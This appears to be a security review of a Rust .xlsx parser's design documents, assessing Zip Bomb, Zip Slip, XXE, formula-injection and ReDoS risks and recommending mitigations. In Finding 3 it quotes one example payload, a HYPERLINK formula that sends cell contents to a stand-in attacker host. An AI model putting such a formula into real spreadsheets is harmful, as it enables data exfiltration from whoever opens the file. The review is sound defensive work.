# `docs/design/` Security Review

*[日本語](design-review.md)*

This is a security review of every design doc under `docs/design/` ([architecture.md](../design/architecture.en.md) and every file it links to — `lib.rs` / `error.rs` / `pipeline.rs` / `container/` / `parse/` / `model/` / `resolve/` / `json.rs` — as of 2026-08-17, satisfying Issue [#3](https://github.com/MinamiyamaKotaro/xlsxparser/issues/3)'s full mapping), focused on the security requirements requirements chapter 2 mandates: Zip Bomb, Zip Slip, and XXE mitigation.

`src/` is still empty — no implementation exists yet. This review therefore evaluates **the soundness of the mitigation strategy as documented in the design**, not a vulnerability assessment of implementation code. A separate code-level security review will be needed once implementation begins.

## Overall Assessment

Of the three threats the requirements spec calls out by name — Zip Bomb, Zip Slip, and XXE — Zip Bomb and Zip Slip mitigation are designed soundly and consistently, down to concrete types and algorithms, across multiple design docs. XXE mitigation, however, despite being stated as a requirement on equal footing with the other two, currently rests in the design docs on an implicit assumption — "depends on the default behavior of whichever XML parser library gets adopted" — with no explicit disabling configuration yet committed at the implementation level (Finding 1 below). Settling this before implementation begins is this review's top-priority recommendation.

## Findings

### Finding 1: XXE mitigation depends on an XML parser's default behavior rather than an explicit setting

* Severity: **Medium** (this is currently a design-doc statement, not a vulnerability in real code — but implementing it as currently written would not satisfy requirements chapter 2's requirement)
* Location: [parse/mod.md](../design/parse/mod.en.md) `create_secure_reader`, [parse/mod.md Open Question 1](../design/parse/mod.en.md)
* Details: The code shown in `create_secure_reader`'s "Key Types / Functions (draft)" only sets `reader.config_mut().trim_text(false);`, which exists to preserve shared-string whitespace (`xml:space="preserve"`) and has nothing to do with XXE. The file's prose regarding XXE itself only states that "`quick-xml` is a non-validating parser that, even in its default configuration, never fetches external entities or an external DTD subset — so classic XXE cannot occur in the first place," without any accompanying API call that explicitly enforces this. The same file's Open Question 1 leaves this undecided: "whether the crate exposes an API that explicitly disables it depends on the version selected."
* Risk scenario: (1) If the assumption that "quick-xml doesn't support DTD processing or external entity references by default" ever stops holding for the version actually adopted (a future minor version changes behavior, or the project switches to a different XML parser), implementing this design as-is — with no explicit disabling call anywhere in the code — leaves XXE (local file disclosure, SSRF, denial of service) exploitable. (2) An implementer could take this doc's "the implicit assumption is sufficient" framing at face value and believe requirements chapter 2's explicit mandate ("disable external entity expansion during XML parsing") is satisfied, when in fact nothing in the code enforces it.
* Recommendations:
  1. When the XML parser crate is chosen (tied to [error.md Open Question 1](../design/error.en.md) / [container/mod.md Open Question 1](../design/container/mod.en.md)), add an explicit setting to `create_secure_reader` that disables external entity and DTD processing (if such an API exists), in a form reviewable in code review. If no such API exists (i.e. the mitigation genuinely relies solely on quick-xml's default behavior), document that fact explicitly in `create_secure_reader`'s comment, along with the specific version and documentation reference it's based on.
  2. Add the XXE-payload integration test already specified in [parse/mod.md Testing Strategy](../design/parse/mod.en.md) early in implementation — before other features — and keep it running continuously in CI. Without this test, there is no objective way to confirm requirements chapter 2's requirement is actually met.

### Finding 2: Zip Bomb's default size limits are unvalidated placeholder values, with no caller-adjustable option yet designed

* Severity: **Low**
* Location: [container/sanitize.md](../design/container/sanitize.en.md) `DEFAULT_MAX_UNCOMPRESSED_SIZE` (512 MiB) / `DEFAULT_MAX_TOTAL_UNCOMPRESSED_SIZE` (2 GiB), [container/sanitize.md Open Question 1](../design/container/sanitize.en.md)
* Details: The limit-enforcement mechanism itself (counting actual bytes read via streaming, never trusting the ZIP header's self-declared size) is soundly designed. But the concrete limit values remain explicitly marked "provisional," and `lib.rs`'s public API ([lib.md](../design/lib.en.md)) currently offers callers no way to adjust them.
* Risk scenario: If the default is too large relative to real-world input file sizes, the relative risk of memory exhaustion (DoS) rises depending on how many requests a single process handles concurrently. If too small, legitimate large files — the "grid-paper Excel" case the requirements spec centers on — could be rejected, an availability problem.
* Recommendation: Before `Cargo.toml` setup and implementation begin, confirm the actual file-size ceiling the requirements spec anticipates with stakeholders and finalize the values, and carry [container/sanitize.md Open Question 1](../design/container/sanitize.en.md)'s already-raised point — "should callers be able to override this" — into `lib.rs`'s design (currently, [lib.md](../design/lib.en.md)'s public API, `parse_workbook`/`parse_workbook_reader`, has no such option).

### Finding 3: Formula-derived and shared-string text values pass through the public API unescaped, with no user-facing warning about downstream CSV/formula injection risk

* Severity: **Low** (not a vulnerability in this library itself — the risk only materializes through a caller's own misuse)
* Location: [model/cell.md](../design/model/cell.en.md) `CellValue::Text`, [json.md](../design/json.en.md), [lib.md](../design/lib.en.md)
* Details: By design, `.xlsx` cell strings (including formula-computed result strings, `t="str"`) pass through into `CellValue::Text` in `Workbook`, and then into the JSON output via `to_json_string`/`to_json_writer`, with no sanitization at any stage. This is safe in the context of JSON output itself (`serde_json` escapes correctly), but if a downstream system that receives this JSON or `Workbook` re-exports the values into CSV or `.xlsx`, a cell value beginning with `=`, `+`, `-`, or `@` could be executed as a formula by whatever spreadsheet application opens the re-exported file (so-called CSV Injection / Formula Injection). This is a natural consequence of a design where the input (untrusted `.xlsx`) passes straight through as output (untrusted text), but neither the design docs nor the README currently mention this risk.
* Risk scenario: An attacker submits an `.xlsx` containing a malicious cell value (e.g. `=HYPERLINK("http://evil.example/?"&A1,"click")`) to an upload feature built on this library. That system passes the parsed result straight into a CSV export feature or another `.xlsx`-generation feature; when a different victim (e.g. another employee) opens the resulting file, the embedded formula executes, potentially leading to data exfiltration or phishing.
* Recommendation: Since having this library itself rewrite values is likely outside the requirements' scope, add a note to [README.md](../../README.md) or [lib.md](../design/lib.en.md)'s public API documentation to the effect of: "String values returned by this library pass cell content through unchanged. Callers re-exporting results as CSV or a spreadsheet format are responsible for their own formula-injection mitigations (e.g. escaping leading special characters)."

### Finding 4: The date/time-detection heuristic for custom number formats (`numFmtId >= 164`) has no committed implementation approach, and a regex-based implementation could become a ReDoS input path

* Severity: **Low** (currently an undecided placeholder, not a confirmed vulnerability)
* Location: [parse/styles.md](../design/parse/styles.en.md) `is_date_time_format`, that file's Open Question 2
* Details: The design calls for scanning `formatCode` (untrusted external input from `styles.xml`) "heuristically" to classify it as a date/time format, but the concrete algorithm — a linear token scan vs. regex pattern matching — is undecided. If a regex prone to catastrophic backtracking is adopted at implementation time, since `formatCode` is a string fully under attacker control, a deliberately crafted `styles.xml` could make a single format-classification call consume CPU time disproportionately.
* Risk scenario: An attacker submits an `.xlsx` whose `styles.xml` contains an extremely long, repetitive `formatCode` string (e.g. heavy use of `\`-escaping patterns), causing the call to `is_date_time_format` to effectively hang.
* Recommendation: Commit, in [parse/styles.md](../design/parse/styles.en.md)'s implementation notes, to an algorithm that completes in linear time — a simple token scan (a backtracking-free state machine, for instance) — or, if a regex is used, a non-backtracking engine (e.g. Rust's `regex` crate, which is RE2-based and guarantees linear time).

## Design Judged Sound (not counted as findings, but documented with rationale)

* **Zip Bomb mitigation** ([container/sanitize.md](../design/container/sanitize.en.md)): never trusting the ZIP header's self-declared size, `BoundedReader` counts actual bytes read via streaming and enforces both a per-entry and a cumulative cap — an effective design against the classic Zip Bomb technique of spoofing the compression ratio.
* **Layered Zip Slip defense** ([container/sanitize.md](../design/container/sanitize.en.md) `validate_entry_path` / [container/mod.md](../design/container/mod.en.md)'s per-call re-validation in `get_entry` / [parse/relationships.md](../design/parse/relationships.en.md) `resolve_target_path`): archive-open-time bulk validation, per-`get_entry`-call re-validation (explicitly designed as defense in depth against dynamically computed paths originating from rels), and never extracting to actual disk at all (sanitize.md states explicitly: "since this library never extracts ZIP entries to actual disk, the traditional Zip Slip harm — unintended file writes — cannot occur directly") together form a consistent triple line of defense. The design decision not to proactively reject the malformed paths `resolve_target_path` can produce (an excessive `..`), instead deferring final defense to `get_entry`, is a reasonable division of responsibility.
* **Panic avoidance in numeric parsing** ([model/cell.md](../design/model/cell.en.md) `CellRef::from_a1`): the policy of returning `Result` rather than panicking on a row-number string that would overflow is explicitly documented, ensuring robustness against untrusted input.
* **Consistent fail-closed principle** ([resolve/merge.md](../design/resolve/merge.en.md)'s merge-range validation, [container/sanitize.md](../design/container/sanitize.en.md)'s `validate_entry_path`, [pipeline.md](../design/pipeline.en.md)'s early-return per phase): the policy of aborting processing entirely, rather than returning a partial result, upon detecting invalid or inconsistent input is applied consistently across multiple modules.
* **Type-erasing external crate errors to cut off dependency leakage** ([error.md](../design/error.en.md)): never exposing the XML parser's (or a future JSON serializer's) error type directly in the public API minimizes the path by which those crates' internal implementation details (version-specific error message text, etc.) could leak into caller code.
* **Excluding the file path from `Error::Io`'s Display text** ([error.md](../design/error.en.md)): keeping `path` as a struct field while excluding it from the `Display` (the `{error}`-equivalent) text means that even if a caller carelessly logs or returns `err.to_string()`, the server's filesystem path is less likely to leak inadvertently.

## Out of Scope

* Concerns about pure resource exhaustion (DoS) — such as the merge-range validation algorithm's O(N²) complexity, or CPU time growing with row/cell counts — are out of this review's scope, given that input size itself is already bounded by the Zip Bomb mitigation's byte-based cap.
* Which ZIP-handling crate `container/` will adopt ([container/mod.md Open Question 1](../design/container/mod.en.md)) is still undecided, so this review does not evaluate that crate's own known vulnerabilities (supply-chain risk). A separate evaluation will be needed once the crate is chosen.
* Since no implementation code exists yet, memory safety (guaranteed by Rust's language features) and any implementation-time deviation from the design policies flagged here are out of scope. A code-level security review should be conducted once implementation is complete.
